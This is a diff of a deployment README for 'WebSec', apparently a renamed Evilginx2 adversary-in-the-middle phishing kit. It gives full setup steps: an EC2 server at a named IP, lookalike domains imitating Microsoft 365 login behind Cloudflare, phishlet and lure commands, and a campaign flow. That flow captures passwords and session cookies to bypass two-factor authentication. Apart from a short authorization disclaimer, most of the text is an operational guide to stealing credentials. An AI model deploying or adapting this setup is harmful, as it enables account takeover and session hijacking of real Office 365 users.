@@ -1,209 +1,194 @@
-# WebSec Phishing Framework - Deployment Guide
+# 🚀 WebSec Deployment Guide - Standalone Setup
 
-A stealthy reverse proxy phishing framework for red team engagements, based on Evilginx2 with enhanced anti-detection capabilities.
+> **Advanced Man-in-the-Middle (MITM) Phishing Framework**  
+> **Domain:** `azbpartner.com` | **Server IP:** `43.205.114.81`
 
-## 🚀 Quick Start
+## 📋 Overview
 
-This guide will help you deploy WebSec on AWS EC2 with Cloudflare integration for maximum stealth and functionality.
+This guide covers deploying WebSec as a standalone phishing framework on AWS EC2 with Cloudflare integration. The setup uses the O365-1 phishlet for advanced Office 365 credential capture with OAuth2/PKCE support.
 
-## 📋 Prerequisites
+### 🎯 What WebSec Does
 
-- AWS EC2 instance (Ubuntu 22.04 LTS recommended)
-- Domain name: `azbpartnars.com`
-- Cloudflare account
-- GoPhish already deployed on separate server
-- Basic knowledge of Linux command line
+- **Reverse Proxy:** Intercepts and modifies web traffic in real-time
+- **Credential Capture:** Captures usernames, passwords, and session tokens
+- **2FA Bypass:** Handles modern authentication flows including PKCE
+- **Session Hijacking:** Steals authentication cookies and tokens
+- **SSL/TLS Management:** Automatic certificate handling
+- **DNS Server:** Resolves phishing domains locally
 
-## 🏗️ Infrastructure Setup
+## 🏗️ Architecture
 
-### Multi-Server Architecture
-
-**Current Setup:**
-- **GoPhish Server:** Already deployed and working
-  - Landing Page: `www.azbpartnars.com`
-  - Admin Panel: `panel.azbpartnars.com:3333`
-- **WebSec Server:** This deployment (43.205.114.81)
-  - O365 Phishing: `login.azbpartnars.com`
-  - Outlook Phishing: `mail.azbpartnars.com`
-  - Generic Phishing: `secure.azbpartnars.com`
-  - Auth Phishing: `auth.azbpartnars.com`
-
-### AWS EC2 Instance Configuration
-
-**Recommended Instance:**
-- Type: `t3.medium` or `t3.large`
-- OS: Ubuntu 22.04 LTS
-- Storage: 20-50GB EBS volume
-- Security Groups: Allow ports 22, 80, 443
-
-**Security Group Rules:**
 ```
-Inbound Rules:
-- Port 22 (SSH) - Your IP only
-- Port 80 (HTTP) - 0.0.0.0/0
-- Port 443 (HTTPS) - 0.0.0.0/0
+┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
+│   Victim        │    │   Cloudflare     │    │   WebSec        │
+│   (Target)      │───▶│   Proxy          │───▶│   Server        │
+│                 │    │   (Orange Cloud) │    │   43.205.114.81 │
+└─────────────────┘    └──────────────────┘    └─────────────────┘
+                                │
+                                ▼
+                       ┌──────────────────┐
+                       │   Real O365      │
+                       │   (Microsoft)    │
+                       └──────────────────┘
 ```
 
-### Cloudflare Configuration
+## 🌐 Domain Configuration
 
-**Current Setup:**
-- GoPhish Landing Page: `www.azbpartnars.com` → [GoPhish Server IP]
-- GoPhish Admin Panel: `panel.azbpartnars.com:3333` → [GoPhish Server IP]
+**Primary Domain:** `azbpartner.com`
 
-**WebSec DNS Records to Add:**
-1. **Add Domain to Cloudflare:**
-   - Add `azbpartnars.com` to your Cloudflare account (if not already added)
-   - Set DNS A records for WebSec subdomains:
-     - `login.azbpartnars.com` → `43.205.114.81` (O365-1 phishlet)
-     - `portal.azbpartnars.com` → `43.205.114.81` (Office portal)
-     - `sso.azbpartnars.com` → `43.205.114.81` (Live SSO)
-     - `auth.azbpartnars.com` → `43.205.114.81` (Token exchange)
-     - `cdn1.azbpartnars.com` → `43.205.114.81` (Asset CDN)
-     - `cdn2.azbpartnars.com` → `43.205.114.81` (Asset CDN)
-   - Enable Cloudflare Proxy (orange cloud) for all subdomains
+**O365-1 Phishlet Subdomains:**
+- `login.azbpartner.com` → `43.205.114.81` (Primary O365 login)
+- `portal.azbpartner.com` → `43.205.114.81` (Office portal redirects)
+- `sso.azbpartner.com` → `43.205.114.81` (Live SSO authentication)
+- `auth.azbpartner.com` → `43.205.114.81` (Token exchange endpoints)
+- `cdn1.azbpartner.com` → `43.205.114.81` (Asset CDN - msftauth.net)
+- `cdn2.azbpartner.com` → `43.205.114.81` (Asset CDN - msauth.net)
 
-2. **SSL/TLS Settings:**
-   - Mode: Full (strict)
-   - Edge Certificates: Always Use HTTPS
-   - Origin Certificates: Create and install for each subdomain
+## 🔧 Prerequisites
 
-## 🔧 Server Setup
+### 1. AWS EC2 Instance
+- **OS:** Ubuntu 22.04 LTS
+- **Type:** t3.medium or higher
+- **IP:** 43.205.114.81
+- **Security Groups:** 
+  - Port 22 (SSH)
+  - Port 80 (HTTP)
+  - Port 443 (HTTPS)
+  - Port 53 (DNS)
 
-### 1. Initial Server Configuration
+### 2. Cloudflare Account
+- Domain `azbpartner.com` added to Cloudflare
+- API token with DNS editing permissions
+- Orange cloud (proxy) enabled for all subdomains
+
+### 3. Domain Registration
+- `azbpartner.com` registered and pointing to Cloudflare nameservers
+
+## 🚀 Installation Steps
+
+### 1. Server Setup
 
 ```bash
-# Connect to your server
-ssh -i your-key.pem ubuntu@43.205.114.81
-
 # Update system
 sudo apt update && sudo apt upgrade -y
 
-# Install required packages
-sudo apt install -y git curl wget build-essential ufw fail2ban
+# Install dependencies
+sudo apt install -y git golang-go build-essential
+
+# Create websec user
+sudo useradd -m -s /bin/bash websec
+sudo usermod -aG sudo websec
+sudo su - websec
 ```
 
-### 2. Install Go
+### 2. Build WebSec
 
 ```bash
-# Download and install Go
-wget https://go.dev/dl/go1.21.5.linux-amd64.tar.gz
-sudo tar -C /usr/local -xzf go1.21.5.linux-amd64.tar.gz
-
-# Add Go to PATH
-echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
-source ~/.bashrc
-
-# Verify installation
-go version
-```
-
-### 3. Deploy WebSec
-
-```bash
-# Clone the repository
-git clone <your-repo-url> /opt/websec
+# Clone and build
+cd /opt
+sudo git clone https://github.com/kgretzky/evilginx2.git websec
+sudo chown -R websec:websec /opt/websec
 cd /opt/websec
 
 # Build the application
-go build -o websec -mod=vendor
+go build -o websec
 
-# Create necessary directories
-mkdir -p ~/.websec/{crt/sites,phishlets,redirectors}
+# Create directories
+mkdir -p ~/.websec/phishlets
+mkdir -p ~/.websec/redirectors
+mkdir -p ~/.websec/crt/sites
 
 # Copy phishlets and redirectors
 cp -r phishlets/* ~/.websec/phishlets/
 cp -r redirectors/* ~/.websec/redirectors/
-
-# Set permissions
-chmod +x websec
-sudo chown -R $USER:$USER ~/.websec
 ```
 
-## 🔐 SSL Certificate Configuration
+### 3. DNS Configuration
 
-### Option 1: Cloudflare Origin Certificate (Recommended)
+**Add to Cloudflare DNS:**
+
+| Type | Name | Content | Proxy Status |
+|------|------|---------|--------------|
+| A | login.azbpartner.com | 43.205.114.81 | Proxied (Orange) |
+| A | portal.azbpartner.com | 43.205.114.81 | Proxied (Orange) |
+| A | sso.azbpartner.com | 43.205.114.81 | Proxied (Orange) |
+| A | auth.azbpartner.com | 43.205.114.81 | Proxied (Orange) |
+| A | cdn1.azbpartner.com | 43.205.114.81 | Proxied (Orange) |
+| A | cdn2.azbpartner.com | 43.205.114.81 | Proxied (Orange) |
+
+**Cloudflare Settings:**
+- SSL/TLS Mode: Full (strict)
+- Edge Certificates: Always Use HTTPS
+- Security Level: Medium
+- WAF: Enabled
+
+### 4. SSL Certificate Setup
+
+**Option 1: Cloudflare Origin Certificate (Recommended)**
 
 ```bash
-# Create certificate directories for O365-1 phishlet subdomains
-mkdir -p ~/.websec/crt/sites/login.azbpartnars.com
-mkdir -p ~/.websec/crt/sites/portal.azbpartnars.com
-mkdir -p ~/.websec/crt/sites/sso.azbpartnars.com
-mkdir -p ~/.websec/crt/sites/auth.azbpartnars.com
-mkdir -p ~/.websec/crt/sites/cdn1.azbpartnars.com
-mkdir -p ~/.websec/crt/sites/cdn2.azbpartnars.com
+# Create certificate directories
+for subdomain in login portal sso auth cdn1 cdn2; do
+    mkdir -p ~/.websec/crt/sites/${subdomain}.azbpartner.com
+done
 
-# Download Cloudflare Origin Certificates from Cloudflare dashboard for each subdomain
+# Download Cloudflare Origin Certificates from Cloudflare dashboard
 # Save as: ~/.websec/crt/sites/[subdomain]/fullchain.pem
 # Save key as: ~/.websec/crt/sites/[subdomain]/privkey.pem
 
-# Set proper permissions for each subdomain
+# Set proper permissions
 for subdomain in login portal sso auth cdn1 cdn2; do
-    chmod 600 ~/.websec/crt/sites/${subdomain}.azbpartnars.com/privkey.pem
-    chmod 644 ~/.websec/crt/sites/${subdomain}.azbpartnars.com/fullchain.pem
+    chmod 600 ~/.websec/crt/sites/${subdomain}.azbpartner.com/privkey.pem
+    chmod 644 ~/.websec/crt/sites/${subdomain}.azbpartner.com/fullchain.pem
 done
 ```
 
-### Option 2: Let's Encrypt (Automatic)
+**Option 2: Let's Encrypt (Automatic)**
 
 ```bash
 # WebSec will automatically obtain Let's Encrypt certificates
-# No additional configuration needed
+# No manual setup required
 ```
 
-## ⚙️ WebSec Configuration
-
-### 1. Initial Configuration
+### 5. Configure WebSec
 
 ```bash
-# Start WebSec in developer mode for initial setup
+# Start WebSec
 cd /opt/websec
-./websec -p ~/.websec/phishlets -t ~/.websec/redirectors -developer
+./websec -p ~/.websec/phishlets -t ~/.websec/redirectors
+
+# In WebSec terminal:
+# Set base domain
+config domain azbpartner.com
+
+# Configure O365-1 phishlet
+phishlets hostname o365-1 login.azbpartner.com
+phishlets enable o365-1
+
+# Verify configuration
+phishlets o365-1
+
+# Create lure for testing
+lures create o365-1
+lures get-url 0
 ```
 
-### 2. Configure Basic Settings
-
-In the WebSec terminal:
+### 6. Systemd Service Setup
 
 ```bash
-# Set domain
-config domain azbpartnars.com
-
-# Set IP and port
-config ip 0.0.0.0
-config port 443
-
-# Disable autocert if using custom certificates
-config autocert off
-
-# Set blacklist mode
-config blacklist off
-
-# Configure GoPhish integration (optional)
-config gophish admin_url https://panel.azbpartnars.com:3333
-config gophish api_key [your-gophish-api-key]
-config gophish test
-
-# Exit developer mode
-exit
-```
-
-### 3. Create Systemd Service
-
-```bash
-# Create systemd service file
+# Create service file
 sudo tee /etc/systemd/system/websec.service > /dev/null <<EOF
 [Unit]
-Description=WebSec Phishing Framework
+Description=WebSec MITM Phishing Framework
 After=network.target
 
 [Service]
 Type=simple
-User=ubuntu
+User=websec
 WorkingDirectory=/opt/websec
-ExecStart=/opt/websec/websec -p /home/ubuntu/.websec/phishlets -t /home/ubuntu/.websec/redirectors
+ExecStart=/opt/websec/websec -p /home/websec/.websec/phishlets -t /home/websec/.websec/redirectors
 Restart=always
-RestartSec=5
-Environment=HOME=/home/ubuntu
+RestartSec=10
 
 [Install]
 WantedBy=multi-user.target
@@ -218,68 +203,16 @@ sudo systemctl start websec
 sudo systemctl status websec
 ```
 
-## 🔥 Firewall Configuration
-
-```bash
-# Configure UFW firewall
-sudo ufw allow 22/tcp
-sudo ufw allow 80/tcp
-sudo ufw allow 443/tcp
-sudo ufw --force enable
-
-# Check status
-sudo ufw status
-```
-
-## 🛡️ Security Hardening
-
-### 1. SSH Security
-
-```bash
-# Disable root login
-sudo sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
-sudo systemctl restart ssh
-
-# Configure fail2ban
-sudo systemctl enable fail2ban
-sudo systemctl start fail2ban
-```
-
-### 2. System Updates
-
-```bash
-# Enable automatic security updates
-sudo apt install unattended-upgrades -y
-sudo dpkg-reconfigure unattended-upgrades
-```
-
-## 🔄 Campaign Flow
-
-### How the Multi-Server Setup Works:
-
-1. **Email Campaign:** Victim receives phishing email from GoPhish
-2. **WebSec Interception:** Victim clicks link → `login.azbpartnars.com`
-3. **O365-1 Phishlet:** Advanced OAuth2/PKCE flow interception
-4. **Credential Capture:** WebSec captures username, password, and session tokens
-5. **Redirect to GoPhish:** After capture, redirect to `www.azbpartnars.com/landing-page`
-6. **Campaign Tracking:** GoPhish tracks completion and provides analytics
-
-### Benefits:
-- **Domain Consistency:** All phishing uses `azbpartnars.com`
-- **Separation of Concerns:** GoPhish for campaigns, WebSec for credential capture
-- **Stealth:** No obvious connection between servers
-- **Scalability:** Easy to add more phishing subdomains
-
 ## 🧪 Testing Your Deployment
 
 ### 1. Basic Connectivity Test
 
 ```bash
 # Test if WebSec is running on O365-1 phishlet subdomains
-curl -k https://login.azbpartnars.com
-curl -k https://portal.azbpartnars.com
-curl -k https://sso.azbpartnars.com
-curl -k https://auth.azbpartnars.com
+curl -k https://login.azbpartner.com
+curl -k https://portal.azbpartner.com
+curl -k https://sso.azbpartner.com
+curl -k https://auth.azbpartner.com
 
 # Check service status
 sudo systemctl status websec
@@ -288,30 +221,38 @@ sudo systemctl status websec
 sudo journalctl -u websec -f
 ```
 
-### 2. Configure O365-1 Phishlet
+### 2. O365-1 Phishlet Testing
 
 ```bash
 # Connect to WebSec
 cd /opt/websec
 ./websec -p ~/.websec/phishlets -t ~/.websec/redirectors
 
-# In WebSec terminal:
-# Configure O365-1 phishlet (advanced O365 phishlet with PKCE support)
-phishlets hostname o365-1 login.azbpartnars.com
-phishlets enable o365-1
+# Test the phishlet flow
+# 1. Visit the lure URL
+curl -k "https://login.azbpartner.com/common/oauth2/v2.0/authorize?client_id=00000003-0000-0000-c000-000000000000&response_type=code&redirect_uri=https://portal.office.com&scope=openid"
 
-# Verify phishlet configuration
+# 2. Check if phishlet is active
 phishlets o365-1
 
-# Create lures for testing
+# 3. Monitor sessions for credential capture
+sessions
+
+# 4. Test lure generation
 lures create o365-1
 lures get-url 0
-
-# Test GoPhish integration
-config gophish test
 ```
 
-### 3. O365-1 Phishlet Features
+### 3. Expected Behavior
+
+When a victim visits your lure:
+1. **Initial Redirect:** `login.azbpartner.com` → Real Microsoft login
+2. **Credential Entry:** Victim enters username/password
+3. **Auto-Submit:** JavaScript automatically submits form
+4. **Token Capture:** WebSec captures authentication tokens
+5. **Session Tracking:** Credentials stored in WebSec sessions
+
+## 📊 O365-1 Phishlet Features
 
 The `o365-1.yaml` phishlet includes:
 
@@ -337,34 +278,7 @@ The `o365-1.yaml` phishlet includes:
 - Password: `passwd` field
 - Session tokens: `ESTSAUTH`, `ESTSAUTHPERSISTENT`, `OTAuth`
 
-### 4. Testing O365-1 Phishlet
-
-```bash
-# Test the phishlet flow
-# 1. Visit the lure URL
-curl -k "https://login.azbpartnars.com/common/oauth2/v2.0/authorize?client_id=00000003-0000-0000-c000-000000000000&response_type=code&redirect_uri=https://portal.office.com&scope=openid"
-
-# 2. Check if phishlet is active
-phishlets o365-1
-
-# 3. Monitor sessions for credential capture
-sessions
-
-# 4. Test GoPhish integration
-config gophish test
-```
-
-### 5. Expected Behavior
-
-When a victim visits your lure:
-1. **Initial Redirect:** `login.azbpartnars.com` → Real Microsoft login
-2. **Credential Entry:** Victim enters username/password
-3. **Auto-Submit:** JavaScript automatically submits form
-4. **Token Capture:** WebSec captures authentication tokens
-5. **Redirect:** Victim redirected to `www.azbpartnars.com/landing-page`
-6. **Session Tracking:** GoPhish tracks campaign completion
-
-## 📊 Monitoring and Maintenance
+## 🔍 Monitoring and Maintenance
 
 ### 1. Log Monitoring
 
@@ -373,52 +287,54 @@ When a victim visits your lure:
 sudo journalctl -u websec -f
 
 # View recent logs
-sudo journalctl -u websec --since "1 hour ago"
+sudo journalctl -u websec -n 100
 
 # Check for errors
 sudo journalctl -u websec -p err
 ```
 
-### 2. Service Management
+### 2. Session Monitoring
 
 ```bash
-# Restart service
-sudo systemctl restart websec
+# Connect to WebSec
+cd /opt/websec
+./websec -p ~/.websec/phishlets -t ~/.websec/redirectors
 
-# Stop service
-sudo systemctl stop websec
+# View captured sessions
+sessions
 
-# Start service
-sudo systemctl start websec
+# View specific session details
+sessions <session_id>
 
-# Check status
-sudo systemctl status websec
+# Clear old sessions
+sessions clear
 ```
 
-### 3. Backup Script
+### 3. Performance Monitoring
 
 ```bash
-# Create backup script
-cat > ~/backup_websec.sh << 'EOF'
-#!/bin/bash
-DATE=$(date +%Y%m%d_%H%M%S)
-tar -czf ~/websec_backup_$DATE.tar.gz ~/.websec
-echo "Backup created: websec_backup_$DATE.tar.gz"
-EOF
+# Check system resources
+htop
 
-chmod +x ~/backup_websec.sh
+# Monitor network connections
+sudo netstat -tlnp | grep websec
 
-# Add to crontab for daily backups
-crontab -e
-# Add: 0 2 * * * /home/ubuntu/backup_websec.sh
+# Check disk usage
+df -h
+
+# Monitor memory usage
+free -h
 ```
 
-## 🔧 Troubleshooting
+## 🛠️ Troubleshooting
 
 ### Common Issues
 
-**1. Service won't start:**
+**1. Service not starting:**
 ```bash
+# Check service status
+sudo systemctl status websec
+
 # Check logs
 sudo journalctl -u websec -n 50
 
@@ -429,50 +345,57 @@ sudo netstat -tlnp | grep :443
 **2. SSL Certificate issues:**
 ```bash
 # Check certificate files for O365-1 phishlet subdomains
-ls -la ~/.websec/crt/sites/login.azbpartnars.com/
-ls -la ~/.websec/crt/sites/portal.azbpartnars.com/
-ls -la ~/.websec/crt/sites/sso.azbpartnars.com/
-ls -la ~/.websec/crt/sites/auth.azbpartnars.com/
+ls -la ~/.websec/crt/sites/login.azbpartner.com/
+ls -la ~/.websec/crt/sites/portal.azbpartner.com/
+ls -la ~/.websec/crt/sites/sso.azbpartner.com/
+ls -la ~/.websec/crt/sites/auth.azbpartner.com/
 
 # Verify certificates
-openssl x509 -in ~/.websec/crt/sites/login.azbpartnars.com/fullchain.pem -text -noout
-openssl x509 -in ~/.websec/crt/sites/portal.azbpartnars.com/fullchain.pem -text -noout
+openssl x509 -in ~/.websec/crt/sites/login.azbpartner.com/fullchain.pem -text -noout
+openssl x509 -in ~/.websec/crt/sites/portal.azbpartner.com/fullchain.pem -text -noout
 ```
 
 **3. Domain not resolving:**
 ```bash
 # Check DNS for O365-1 phishlet subdomains
-nslookup login.azbpartnars.com
-nslookup portal.azbpartnars.com
-nslookup sso.azbpartnars.com
-nslookup auth.azbpartnars.com
+nslookup login.azbpartner.com
+nslookup portal.azbpartner.com
+nslookup sso.azbpartner.com
+nslookup auth.azbpartner.com
 
 # Check Cloudflare settings
 # Ensure A records point to 43.205.114.81
 ```
 
-**4. GoPhish integration issues:**
+**4. Phishlet not working:**
 ```bash
-# Test GoPhish connection
-config gophish test
+# Check phishlet configuration
+phishlets o365-1
 
-# Check GoPhish admin panel
-curl -k https://panel.azbpartnars.com:3333
+# Verify hostname is set
+phishlets hostname o365-1
+
+# Check if phishlet is enabled
+phishlets
+
+# Test lure generation
+lures create o365-1
+lures get-url 0
 ```
 
-### Useful Commands
+### Advanced Troubleshooting
 
 ```bash
-# Check if WebSec is listening
-sudo netstat -tlnp | grep websec
-
 # Check process
 ps aux | grep websec
 
+# Check network connections
+sudo netstat -tlnp | grep websec
+
 # Test SSL for O365-1 phishlet subdomains
-openssl s_client -connect login.azbpartnars.com:443 -servername login.azbpartnars.com
-openssl s_client -connect portal.azbpartnars.com:443 -servername portal.azbpartnars.com
-openssl s_client -connect sso.azbpartnars.com:443 -servername sso.azbpartnars.com
+openssl s_client -connect login.azbpartner.com:443 -servername login.azbpartner.com
+openssl s_client -connect portal.azbpartner.com:443 -servername portal.azbpartner.com
+openssl s_client -connect sso.azbpartner.com:443 -servername sso.azbpartner.com
 ```
 
 ## 📁 Directory Structure
@@ -485,22 +408,22 @@ openssl s_client -connect sso.azbpartnars.com:443 -servername sso.azbpartnars.co
 
 ~/.websec/                      # Configuration directory
 ├── crt/sites/                  # SSL certificates
-│   ├── login.azbpartnars.com/  # O365-1 primary login
+│   ├── login.azbpartner.com/   # O365-1 primary login
 │   │   ├── fullchain.pem      # Public certificate
 │   │   └── privkey.pem        # Private key
-│   ├── portal.azbpartnars.com/ # Office portal redirects
+│   ├── portal.azbpartner.com/ # Office portal redirects
 │   │   ├── fullchain.pem      # Public certificate
 │   │   └── privkey.pem        # Private key
-│   ├── sso.azbpartnars.com/    # Live SSO authentication
+│   ├── sso.azbpartner.com/    # Live SSO authentication
 │   │   ├── fullchain.pem      # Public certificate
 │   │   └── privkey.pem        # Private key
-│   ├── auth.azbpartnars.com/   # Token exchange endpoints
+│   ├── auth.azbpartner.com/   # Token exchange endpoints
 │   │   ├── fullchain.pem      # Public certificate
 │   │   └── privkey.pem        # Private key
-│   ├── cdn1.azbpartnars.com/   # Asset CDN (msftauth.net)
+│   ├── cdn1.azbpartner.com/   # Asset CDN (msftauth.net)
 │   │   ├── fullchain.pem      # Public certificate
 │   │   └── privkey.pem        # Private key
-│   └── cdn2.azbpartnars.com/   # Asset CDN (msauth.net)
+│   └── cdn2.azbpartner.com/   # Asset CDN (msauth.net)
 │       ├── fullchain.pem      # Public certificate
 │       └── privkey.pem        # Private key
 ├── phishlets/                  # Active phishlets (o365-1.yaml)
@@ -511,40 +434,53 @@ openssl s_client -connect sso.azbpartnars.com:443 -servername sso.azbpartnars.co
 
 ### Important Notes
 
-1. **Always use HTTPS** - Never run in HTTP mode for production
-2. **Monitor logs regularly** - Check for errors or suspicious activity
-3. **Keep certificates updated** - Set up automatic renewal
-4. **Use strong passwords** - For SSH and all services
-5. **Regular backups** - Backup configuration and data
-6. **Test thoroughly** - Before using in actual engagements
+⚠️ **Legal Compliance:** Only use this framework for authorized security testing and penetration testing engagements. Ensure you have proper written authorization before testing any systems.
 
-### Legal Disclaimer
+🔒 **Access Control:** 
+- Restrict SSH access to authorized IPs only
+- Use key-based authentication
+- Regularly update system packages
+- Monitor access logs
 
-This tool is intended for authorized security testing and red team engagements only. Users are responsible for ensuring they have proper authorization before using this tool. The authors are not responsible for any misuse of this software.
+🌐 **Network Security:**
+- Configure firewall rules properly
+- Use Cloudflare WAF for additional protection
+- Monitor for suspicious activity
+- Keep SSL certificates updated
+
+📊 **Data Protection:**
+- Encrypt sensitive data at rest
+- Regularly backup configuration
+- Implement proper logging
+- Monitor for data breaches
+
+## 🔄 Maintenance Tasks
+
+### Daily
+- Check service status: `sudo systemctl status websec`
+- Monitor logs: `sudo journalctl -u websec -f`
+- Check captured sessions: `sessions`
+
+### Weekly
+- Update system packages: `sudo apt update && sudo apt upgrade`
+- Review and clear old sessions: `sessions clear`
+- Check SSL certificate expiration
+- Review access logs
+
+### Monthly
+- Backup configuration: `tar -czf websec-backup-$(date +%Y%m%d).tar.gz ~/.websec`
+- Review security settings
+- Update Cloudflare rules
+- Performance optimization
 
 ## 📞 Support
 
 For issues and questions:
-1. Check the troubleshooting section above
-2. Review logs: `sudo journalctl -u websec -f`
-3. Verify configuration files
-4. Check network connectivity and DNS resolution
-
-## 🎯 Deployment Checklist
-
-- [ ] AWS EC2 instance launched with proper security groups
-- [ ] Go installed and working
-- [ ] WebSec built successfully
-- [ ] Domain `azbpartnars.com` configured in Cloudflare
-- [ ] DNS A records for subdomains pointing to `43.205.114.81`
-- [ ] GoPhish integration configured (optional)
-- [ ] SSL certificates configured
-- [ ] Systemd service created and running
-- [ ] Firewall configured
-- [ ] Security measures implemented
-- [ ] Backup strategy in place
-- [ ] Testing completed
+- Check the troubleshooting section above
+- Review logs: `sudo journalctl -u websec -f`
+- Verify configuration: `phishlets o365-1`
+- Test connectivity: `curl -k https://login.azbpartner.com`
 
 ---
 
-**Your WebSec deployment is now ready for red team engagements with maximum stealth and functionality!**
+**⚠️ Disclaimer:** This tool is for authorized security testing only. Always ensure you have proper authorization before testing any systems. The authors are not responsible for misuse of this software.
